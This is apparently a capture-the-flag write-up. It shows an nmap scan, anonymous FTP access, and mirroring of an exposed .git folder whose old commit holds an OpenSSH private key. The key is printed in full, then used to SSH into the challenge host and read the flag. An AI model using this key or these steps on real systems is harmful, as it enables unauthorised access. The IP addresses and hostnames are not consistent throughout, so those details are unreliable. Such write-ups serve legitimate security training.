## Task :
You are a time traveler who stumbled upon an ancient Git repository containing valuable data from a long-gone era. However, the repository seems to have some hidden secrets and potential vulnerabilities in its history. Charlie is your friend.

`143.110.189.89`

## Points : 200

## Solution:

The challenge gives us an ip address, a domain and port.
Running a quick nmap scan on the ip reveal it has a ftp server running on it.
```sh
[ssk@arch kic]$ nmap -F 143.110.180.89
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-30 16:42 IST
Nmap scan report for 143.110.180.89
Host is up (@.14s latency).
Not shown: 97 filtered tcp ports (no-response)
PORT    STATE   SERVICE
21/tcp  open    ftp
80/tcp  closed  http
443/tcp closed  https

Nmap done: 1 IP address (1 host up) scanned in 5.65 seconds
```

We can anonymously login into the ftp server using `anonymous` as the username and password.
The server has a `login.html` file and a `.git` folder. I cloned the complete server to further examine the files.
```sh
[ssk@arch kic]$ ftp 143.110.180.89
Connected to 143.110.180.89.
220 (vsFTPd 3.0.5)
Name (143.110.180.89:ssk): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x  1    1000   1000    4096 Jul 25 10:31 .
dr-xr-xr-x  1    1000   1000    4096 Jul 25 10:31 ..
drwxrwxr-x  8    0      0       4096 Apr 09 18:58 .git
-rw-rw-r--  1    0      0       514  Apr 09 18:58 login.html
226 Directory send OK.
ftp> quit
221 Goodbye.
[ssk@arch kic]$ wget -r --no-passive --no-parent --user=anonymous --password=anonymous ftp://143.110.180.89
```
Using git status allows us to see that there are two older commits also. On switching to the oldest commit, the `index.html` file has a OpenSSH private key inside it.

Output of `git log`:
```
commit 00231aa51594c4d44631ce9237255fe779afa72c (HEAD -> main, origin/main, origin/HEAD)
Author: 4dity4k <k2000aditya@yahoo.com>
Date:   Mon Apr 10 00:25:47 2023 +0530

    Smart cookie

commit b5488e6d7b3e27949d825292fa992562333c1de9
Author: 4dity4k <k2000aditya@yahoo.com>
Date:   Sun Apr 9 23:43:58 2023 +0530

    Latest and fresh

commit 5a496dbebbce1585698634e5348703b74e7ac781
Author: 4dity4k <k2000aditya@yahoo.com>
Date:   Sun Apr 9 23:20:43 2023 +0530

    My first web application
```

```sh
[ssk@arch back]$ git checkout 5a496dbebbce1585698634e5348703b74e7ac781
Note: switching to '5a496dbebbce1585698634e5348703b74e7ac781'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at 5a496db My first web application
[ssk@arch back]$ cat login.html 
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Login</title>
</head>
<body>
    <h1>Login</h1>
    <form method="POST">
        <label for="username">Username:</label>
        <input type="text" name="username" id="username" required>
        <br><br>
        <label for="password">Password:</label>
        <input type="password" name="password" id="password" required>
        <br><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----```
We can use extract the private key and use it to ssh into the server containing the flag.
```sh
[ssk@arch back]$ sudo ssh charlie@0.cloud.chals.io -p 31080 -i private_key
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.4.0-155-generic x86_64)

* Documentation:    https://help.ubuntu.com
* Management:       https://landscape.canonical.com
* Support:          https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ ls
user. txt
$ cat user.txt
KPMG_CTF{324b7e52953f62f1624fb64a2e8202e4}
$ exit
Connection to 8.cloud.chals.io closed.
```